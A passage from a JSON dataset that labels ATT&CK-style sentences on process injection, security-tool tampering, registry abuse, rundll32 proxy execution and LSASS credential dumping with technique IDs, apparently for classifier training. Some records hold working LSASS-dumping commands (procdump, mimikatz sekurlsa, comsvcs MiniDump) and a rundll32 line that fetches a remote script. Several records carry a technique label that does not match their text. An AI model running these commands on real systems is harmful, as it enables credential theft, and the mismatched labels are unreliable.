    "text": "VDSO hijacking involves redirecting calls to dynamically linked shared libraries.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Memory protections may prevent writing executable code to a process via Ptrace System Calls.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ListPlanting is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "List-view controls are user interface windows used to display collections of items.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Information about an application's list-view settings are stored within the process' memory in a SysListView32 control.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window (via Windows API calls such as FindWindow and/or EnumWindows) or other Process Injection methods.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Consider monitoring for excessive use of SendMessage and/or PostMessage API functions with LVM_SETITEMPOSITION and/or LVM_GETITEMPOSITION arguments.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows API calls such as FindWindow, FindWindowEx, EnumWindows, EnumChildWindows, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be abused for this technique.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Analyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This may take the many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also tamper with artifacts deployed and utilized by security tools.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Security tools may make dynamic changes to system components in order to maintain visibility into specific events.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Bundlore can change browser security settings to enable extensions to be installed.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Bundlore uses the pkill cfprefsd command to prevent users from inspecting processes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services..",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Maze has disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Night Dragon has disabled anti-virus and anti-spyware tools in some instances on the victim’s machines.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with security services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering with security services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for the execution of commands and arguments associated with disabling or modification of security software processes or services such as Set-MpPreference-DisableScriptScanning 1 in Windows,sudo spctl --master-disable in macOS, and setenforce 0 in Linux.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor processes for unexpected termination related to security tools/services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Lack of expected log events may be suspicious.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for telemetry that provides context of security software services being disabled or modified.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for deletion of Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may delete files left behind by the actions of their intrusion activity.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "APT29 routinely removed their tools, including custom backdoors, once remote access was achieved.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "APT29 has also used SDelete to remove artifacts from victims.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware has deleted files in various ways, including \"suicide scripts\" to delete malware binaries from the victim.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "OSX_OCEANLOTUS.D deletes the app bundle and dropper after execution.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "RDAT can issue SOAP requests to delete already processed C2 emails.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "RDAT can also delete itself from the infected system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "It also can uninstall scripts and delete files to cover its track.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for unexpected deletion of files from the system",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The built-in Windows command-line utility Reg may be used for local or remote Registry modification.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The Registry of a remote system may be modified to aid in execution of files as part of lateral movement.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It requires the remote Registry service to be running on the target system.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot writes data into the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA can add, modify, and/or delete registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It has changed the proxy configuration of a victim system by modifying the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\[service_name]\\Start registry entries to value 4.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "TEARDROP modified the Registry to create a Windows service for itself on a compromised host.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments for actions that could be taken to change, conceal, and/or delete information in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The Registry may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls associated with concealing Registry keys, such as Reghide.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns and RegDelNull .",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Monitor processes and command-line arguments for actions that could be taken to change, conceal, and/or delete information in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "( reg.exe, regedit.exe)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed registry keys or values to aid in persistence and execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for unexpected deletion of windows registry keys to hide configuration information, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to windows registry keys or values.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods).",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, , are suspicious, as are additions or changes to files within the startup folder.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Changes could also include new services and modification of existing binary paths to point to malicious files.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may abuse rundll32.exe to proxy execution of malicious code.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Using rundll32.exe, vice executing directly ( Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Double-clicking a .cpl file also causes rundll32.exe to execute.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Rundll32 can also be used to execute scripts such as JavaScript.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "]com/malicious.sct\")\" This behavior has been seen used by malware such as Poweliks.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (, given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction).",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe \"C:\\Windows\\twain_64.dll\".",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "APT28 also executed a .dll for a first stage dropper using rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass application control.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Analyze contextual data about executed DLL files, which may include information such as name, the content (ex: signature, headers, or data/media), age, user/ower, permissions,",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Use process monitoring to monitor the execution and arguments of rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "It is not configured by default and has hardware and firmware system requirements.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "It also does not protect against all forms of credential dumping.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Consider disabling or restricting NTLM.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Consider disabling WDigest authentication.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Note: Domain controllers may not log replication requests originating from the default domain controller account.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for replication requests from IPs not associated with known domain controllers.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Look for command-lines that invoke AuditD or the Security Accounts Manager (SAM).",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Remote access tools may contain built-in features or incorporate existing tools like Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for hash dumpers opening the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM).",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Others will make an in-memory copy of the SAM table before reading hashes.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for unexpected processes interacting with lsass.exe.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "This file is stored under the path /proc/<pid>/maps, where the <pid> directory is the unique pid of the program being interrogated for such authentication data.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly executed processes that may be indicative of credential dumping.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for the SAM registry key being accessed that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, on the target host use procdump:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Locally, mimikatz can be run using:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Built-in Windows tools such as comsvcs.dll can also be used:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The following SSPs can be used to access credentials:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "procdump -ma lsass.exe lsass_dump",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "sekurlsa::Minidump lsassdump.dmp",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "sekurlsa::logonPasswords",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "They have also dumped the LSASS process memory using the MiniDump function.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls that may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Detection of compromised Valid Accounts in-use by adversaries may help as well.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Remote access tools with built-in features may interact directly with the Windows API to gather information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Many command shell utilities can be used to obtain this information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Examples include dir, tree, ls, find, and locate.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Custom tools may also be used to gather file and directory information and interact with the Native API.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
